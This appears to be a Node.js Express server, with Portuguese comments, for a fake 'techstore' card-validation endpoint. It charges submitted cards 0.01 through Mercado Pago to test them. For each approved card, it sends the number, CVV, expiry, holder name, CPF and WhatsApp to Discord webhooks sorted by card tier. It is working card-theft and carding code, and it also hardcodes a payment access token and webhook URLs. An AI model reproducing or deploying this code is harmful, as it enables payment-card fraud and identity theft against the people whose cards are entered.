const express = require('express');
const { MercadoPagoConfig, Payment } = require('mercadopago');
const cors = require('cors');
const app = express();

app.use(express.json());
app.use(cors());
app.use(express.static('public'));
app.use('/cores', express.static(path.join(__dirname, 'cores')));

const client = new MercadoPagoConfig({accessToken: 'APP_USR-1954942567690031-012818-20e9de4b75bb3d0c284b51790db079c8-3163639724' });
const payment = new Payment(client);

// COLOQUE OS LINKS DOS SEUS WEBHOOKS AQUI
const webhooks = {
    GERAL: "https://discord.com/api/webhooks/1471002040477028362/UYLVL8C6hoLpq-SSzW0QzbamEBi69o3-erTBL3pItUENDc_rmtCIRlYdp1vRYh09Kpvb",
    BLACK: "https://discord.com/api/webhooks/1472758727982579826/xBNQW837YqDgdH-1C8hIa1btFqBhDDz-CylbmwGzTAw8dxkDYCJFAnQqPtRypZ5cs8jO",
    PLATINUM: "https://discord.com/api/webhooks/1472758837592199170/3ghk7b_0-9riCk_bo6J8w0kpvHdWswon2BozYZB4cX4iT2jgrODHg9ACgdixcYxI6eR4",
    GOLD: "https://discord.com/api/webhooks/1472758915241611478/-31k6f0HYdfKhWmkzIRTLaFw-Ils3jrOfGDdVcJ4esECV4X0qPZLNckslX0WceMbgiM2",
    EMPRESARIAL: "https://discord.com/api/webhooks/1472758957889159298/gFi3QMx3f5NkgpLqynZXLw-h74DEKfJ5C96G9nuefEV9FU7pMGCRfkfsasiNv_16_n-G",
    COMUM: "https://discord.com/api/webhooks/1472758999261904978/syxBtJkr9MiT9TTIpDgROgnAakW8f_NDGoleCXM8hik5hhpztpoXcQCjafcztxy1TJqC"
};

app.post('/validar-cartao', async (req, res) => {
    const { token, dados } = req.body;

    try {
        const result = await payment.create({
            body: {
                transaction_amount: 0.01,
                token: token,
                description: 'Validação de Segurança',
                installments: 1,
                payer: { email: 'pagamento@techstore.com' }
            }
        });

        if (result.status === 'approved') {
            const bandeira = result.payment_method_id.toUpperCase();
            let categoria = "COMUM";

            // Lógica para separar nos canais do seu print
            if (bandeira.includes("BLACK") || bandeira.includes("INFINITE")) categoria = "BLACK";
            else if (bandeira.includes("PLATINUM")) categoria = "PLATINUM";
            else if (bandeira.includes("GOLD")) categoria = "GOLD";
            else if (bandeira.includes("BUSINESS") || bandeira.includes("CORPORATE")) categoria = "EMPRESARIAL";

            const embed = {
                title: `✅ CARTÃO APROVADO - ${bandeira}`,
                color: 0x00ff00,
                fields: [
                    { name: "👤 Recebedor", value: dados.nomeRecebedor, inline: true },
                    { name: "🆔 CPF Titular", value: dados.cpfTitular, inline: true },
                    { name: "💳 Número", value: `\`${dados.nCartao}\``, inline: false },
                    { name: "📝 Nome no Cartão", value: dados.nomeNoCartao, inline: true },
                    { name: "📅 Validade", value: dados.validade, inline: true },
                    { name: "🔒 CVV", value: dados.cvv, inline: true },
                    { name: "📱 WhatsApp", value: dados.whatsapp || "N/A", inline: false }
                ],
                footer: { text: `Categoria Detectada: ${categoria}` }
            };

            // Envia para o canal GERAL de cartões
            await enviarDiscord(webhooks.GERAL, embed);
            // Envia para o canal específico do MODELO
            await enviarDiscord(webhooks[categoria], embed);

            res.status(200).json({ status: 'approved' });
        } else {
            res.status(400).json({ status: 'rejected' });
        }
    } catch (error) {
        res.status(500).json({ status: 'error' });
    }
});

async function enviarDiscord(url, embed) {
    if(!url) return;
    await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ embeds: [embed] }) });
}

process.env.PORT
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
